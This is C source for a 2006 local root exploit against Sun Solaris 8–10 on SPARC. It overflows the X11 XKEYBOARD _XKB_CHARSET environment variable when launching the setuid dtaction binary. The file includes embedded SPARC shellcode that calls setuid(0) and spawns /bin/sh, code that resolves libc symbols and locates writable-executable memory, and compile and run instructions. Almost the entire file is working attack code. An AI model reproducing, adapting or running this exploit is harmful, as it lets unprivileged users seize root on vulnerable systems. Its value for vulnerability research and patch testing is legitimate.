/*
 *  X11R6 XKEYBOARD extension Strcmp() for Sun Solaris 8 9 10 SPARC
 *  Copyright 2006 RISE Security <contact@risesecurity.org>,
 *  Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 *  Compile with the following command.
 *  $ (g)cc -Wall -ldl -o sol-sparc-xkb sol-sparc-xkb.c
 *
 *  Set the DISPLAY environment variable to a X Window System server with
 *  XKEYBOARD extension enabled.
 *  $ ./sol-sparc-xkb sprintf|strcpy xserver:display
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <link.h>
#include <sys/systeminfo.h>
#include <procfs.h>

#define BUFSIZE 13+256+64+2+1
#define FRMSIZE 64+3+1
#define ADRSIZE 2047+1
#define SHLSIZE strlen(shellcode)+1
#define DSPSIZE strlen(display)+1
#define ARGSIZE 7+1
#define ENVSIZE BUFSIZE+FRMSIZE+ADRSIZE+SHLSIZE+DSPSIZE
#define PFMSIZE strlen(platform)+1
#define PRGSIZE 20+1

#define PAD(a,b,c) \
    a+=((b+c)%2)?(((a%8)>4)?(16-(a%8)):(8-(a%8))):((a%8)?(12-(a%8)):4);

char shellcode[]=           /*  60 bytes                          */
    "\x90\x1a\x40\x09"      /*  xor     %o1,%o1,%o0               */
    "\x82\x10\x20\x17"      /*  mov     0x17,%g1                  */
    "\x91\xd0\x20\x08"      /*  ta      0x08                      */
    "\x21\x0b\xd8\x9a"      /*  sethi   %hi(0x2f62696e),%l0       */
    "\xa0\x14\x29\x6e"      /*  or      %l0,0x96e,%l0             */
    "\x23\x0b\xdc\xda"      /*  sethi   %hi(0x2f736800),%l1       */
    "\x90\x23\xa0\x08"      /*  sub     %sp,0x08,%o0              */
    "\x92\x23\xa0\x10"      /*  sub     %sp,0x10,%o1              */
    "\x94\x1a\x80\x0a"      /*  xor     %o2,%o2,%o2               */
    "\xe0\x23\xbf\xf8"      /*  st      %l0,[%sp-0x08]            */
    "\xe2\x23\xbf\xfc"      /*  st      %l1,[%sp-0x04]            */
    "\xd0\x23\xbf\xf0"      /*  st      %o0,[%sp-0x10]            */
    "\xc0\x23\xbf\xf4"      /*  st      %g0,[%sp-0x0c]            */
    "\x82\x10\x20\x3b"      /*  mov     0x3b,%g1                  */
    "\x91\xd0\x20\x08"      /*  ta      0x08                      */
;

void *find_symbol(const char *symbol){
    void *handle,*addr;
    char *err;

    if((handle=dlmopen(LM_ID_LDSO,NULL,RTLD_LAZY))==NULL){
        fprintf(stderr,"%s\n",dlerror());
        exit(EXIT_FAILURE);
    }

    dlerror();
    addr=dlsym(handle,symbol);
    if((err=dlerror())!=NULL){
        fprintf(stderr,"%s\n",err);
        exit(EXIT_FAILURE);
    }

    dlclose(handle);

    return addr;
}

void *find_rwxmem(void){
    FILE *fp;
    prmap_t map;
    int flags;
    void *addr;

    if((fp=fopen("/proc/self/map","rb"))==NULL){
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    while(fread(&map,sizeof(map),1,fp)){
        flags=map.pr_mflags;

        if((flags&(MA_READ|MA_WRITE|MA_EXEC))==(MA_READ|MA_WRITE|MA_EXEC)){
            if(flags&MA_STACK) continue;
            addr=(void *)map.pr_vaddr;
        }
    }

    fclose(fp);

    return addr;
}

int main(int argc,char **argv){
    char buf[8192],display[256],platform[256],addr[8][4],*envp[6],*p;
    int base,offset,i,flag=0;

    printf("X11R6 XKEYBOARD extension Strcmp() for Sun Solaris 8 9 10 SPARC\n");
    printf("Copyright 2006 RISE Security <contact@risesecurity.org>\n\n");

    if(argc!=3){
        fprintf(stderr,"usage: %s sprintf|strcpy xserver:display\n",argv[0]);
        exit(EXIT_FAILURE);
    }

    if(!strcmp(argv[1],"sprintf")) flag=1;
    if(!strcmp(argv[1],"strcpy")) flag=2;

    if(!flag){
        fprintf(stderr,"usage: %s sprintf|strcpy xserver:display\n",argv[0]);
        exit(EXIT_FAILURE);
    }

    snprintf(display,sizeof(display),"DISPLAY=%s",argv[2]);

    if(sysinfo(SI_PLATFORM,platform,sizeof(platform))==-1){
        perror("sysinfo");
        exit(EXIT_FAILURE);
    }

    base=((int)argv[0]|0xffff);
    base++;

    offset=ARGSIZE+ENVSIZE+PFMSIZE+PRGSIZE;
    PAD(offset,1,sizeof(envp)-1);

    *((int *)addr[0])=base-offset+ARGSIZE+BUFSIZE;
    *((int *)addr[1])=base-offset+ARGSIZE+BUFSIZE+FRMSIZE;
    *((int *)addr[2])=base-offset+ARGSIZE+BUFSIZE+FRMSIZE+ADRSIZE;

    switch(flag){
    case 1: *((int *)addr[3])=(int)find_symbol("sprintf")-4; break;
    case 2: *((int *)addr[3])=(int)find_symbol("strcpy")-4;
    }

    *((int *)addr[4])=(int)find_rwxmem()+4;
    *((int *)addr[5])=*((int *)addr[4])-8;

    p=buf;
    sprintf(p,"_XKB_CHARSET=");
    p=buf+13;
    for(i=0;i<256;i++) *p++='A';
    for(i=0;i<66;i++) *p++=addr[1][i%4];
    *p='\0';

    memcpy(buf+13+256+56,addr[0],4);
    memcpy(buf+13+256+60,addr[3],4);

    p=buf+1024;;
    for(i=0;i<(FRMSIZE-1);i++) *p++=addr[1][i%4];
    *p='\0';

    memcpy(buf+1024+32,addr[4],4);
    memcpy(buf+1024+36,addr[2],4);
    memcpy(buf+1024+60,addr[5],4);

    p=buf+2048;
    for(i=0;i<(ADRSIZE-1);i++) *p++=addr[1][i%4];
    *p='\0';

    envp[0]=&buf[0];
    envp[1]=&buf[1024];
    envp[2]=&buf[2048];
    envp[3]=shellcode;
    envp[4]=display;
    envp[5]=NULL;

    execle("/usr/dt/bin/dtaction","AAAAAAA",0,envp);

    exit(EXIT_FAILURE);
}

